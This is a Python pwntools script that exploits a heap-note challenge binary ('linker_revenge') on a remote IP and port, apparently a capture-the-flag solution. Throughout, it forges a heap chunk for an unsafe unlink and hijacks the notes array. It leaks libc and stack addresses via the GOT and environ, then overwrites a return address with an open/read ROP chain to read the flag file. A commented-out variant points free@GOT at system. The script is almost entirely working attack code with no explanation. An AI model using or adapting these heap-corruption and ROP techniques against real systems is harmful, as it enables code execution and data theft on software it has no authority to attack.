from pwn import *
from pwn import log as Log
from time import sleep
puts_plt = 0x400820
start = 0x4006d0
pop_rdi = 0x0000000000400e83
main_start_got = 0x0000000000601ff0
free_got = 0x0000000000601f78
def log(title,value):
	Log.info(title + ": {} ".format(hex(value)))
#p = process("./main")
p = remote("18.209.178.166",9632)
elf = ELF("./linker_revenge")
name = elf.symbols["name"]
period = 0.2
chunk_addr = name - 0x30
def new_page(size):
	p.sendline("1")
	sleep(period)
	p.recv(8000)
	p.sendline(str(size))
	sleep(period)
	p.recv(8000)

def view_page(index):
	p.sendline("5")
	sleep(period)
	p.recvuntil("index:\n")
	p.sendline(str(index))
	sleep(period)
	#p.interactive()
	data = p.recvline().strip()
	p.recv(8000)
	return data

def edit(index,data):
	p.sendline("2")
	sleep(period)
	p.recv(8000)
	p.sendline(str(index))
	sleep(period)
	p.recv(8000)
	p.send(data)
	sleep(period)
	p.recv(8000)

def delete_page(index):
	p.sendline("3")
	sleep(period)
	p.recv(8000)
	p.sendline(str(index))
	sleep(period)
	p.recv(8000)

def login(size,name):
	p.recv(8000)
	p.sendline(str(size))
	sleep(period)
	p.recv(8000)
	p.send(name)
	sleep(period)
	p.recv(8000)

def relogin(name):
	p.sendline("4")
	sleep(period)
	p.recv(8000)
	p.send(name)
	sleep(period)
	p.recv(8000)
def Exit():
	p.sendline("6")
	sleep(period)

def delete_leak(index):
	p.sendline("3")
	sleep(period)
	p.recv(8000)
	p.sendline(str(index))
	sleep(period)

unlink = name - 0x48

login(8,"flag")
print "tcache .."
for _ in range(7):
	new_page(0x128)
	delete_page(0)
print "tcache done"
new_page(0x128)
new_page(0x128)
delete_page(0)
edit(0,p64(0) + p64(0x121) + p64(chunk_addr-0x18) + p64(chunk_addr - 0x10) + "A"*0x100 + p64(0x120))
delete_page(1)
print "unlink done"
edit(0,p32(1) + p32(0) + p64(0)*2 + p64(unlink) + p64(free_got) + p64(main_start_got))
print "leak ..."
data = view_page(2)
leak = u64(data.ljust(8,"\x00"))
log("leak",leak)
base = leak - 0x21ab0
log("base",base)
opn = base + 0x000000000010fd50
rd = base + 0x0000000000110180
wrt = base + 0x0000000000110250
pop_rdx = base + 0x0000000000001b96
pop_rsi = base + 0x0000000000023e8a
environ = base + 0x00000000003ee098
pop_rdi = base + 0x000000000002155f
flag_file = name

edit(0,p32(1) + p32(0) + p64(0)*2 + p64(unlink) + p64(free_got) + p64(environ))
stack = view_page(2)
stack = u64(stack.ljust(8,"\x00"))
log("stack",stack)
ret_ptr = stack - 0x140
edit(0,p32(1) + p32(0) + p64(0)*2 + p64(unlink) + p64(ret_ptr) + p64(ret_ptr))
rop = ""
rop += p64(pop_rdi)
rop += p64(flag_file)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(opn)
# read
rop += p64(pop_rdi)
rop += p64(6)
rop += p64(pop_rsi)
rop += p64(flag_file+0x200)
rop += p64(pop_rdx)
rop += p64(50)
rop += p64(rd)
rop += p64(0x000000000040121d)
print "leak done"
print "ropping ..."
#pause()
edit(1,rop)
edit(0,p32(1) + p32(0) + p64(0)*2 + p64(unlink) + p64(free_got) + p64(flag_file+0x200))
p.sendline("5")
sleep(period)
p.sendline("2")
sleep(period)

"""
edit(1,p64(puts_plt))
delete_leak(2)
leak = p.recvline().strip()
p.recv(8000)
leak = u64(leak.ljust(8,"\x00"))
base = leak - 0x0000000000021ab0
system = base + 0x000000000004f440
log("leak",leak)
log("base",base)
log("system",system)
edit(0,p32(1) + p32(0) + p64(0)*2 + p64(0x00000000006020c8) + p64(free_got) + p64(0x602110))
edit(1,p64(system))
delete_leak(2)
"""
p.interactive()

